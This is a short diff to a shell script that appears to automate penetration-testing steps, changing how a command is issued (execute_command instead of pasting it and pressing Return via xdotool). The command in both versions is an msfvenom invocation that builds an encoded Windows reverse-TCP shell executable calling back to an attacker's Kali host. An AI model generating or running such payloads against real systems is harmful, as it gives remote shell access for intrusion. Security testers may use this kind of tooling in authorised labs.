@@ -14,5 +14,5 @@ generate_form "${LPORT_FIELD}" "${OUTPUT_FILE_FIELD}"
 LPORT=${form_data["lport"]}
 OUTPUT_FILE=${form_data["output_file"]}
 
-paste_command "msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -b "\x00" -e x86/shikata_ga_nai -f exe -o ${OUTPUT_FILE}"
-xdotool key Return
+execute_command "msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -b "\x00" -e x86/shikata_ga_nai -f exe -o ${OUTPUT_FILE}"
+create_new_line
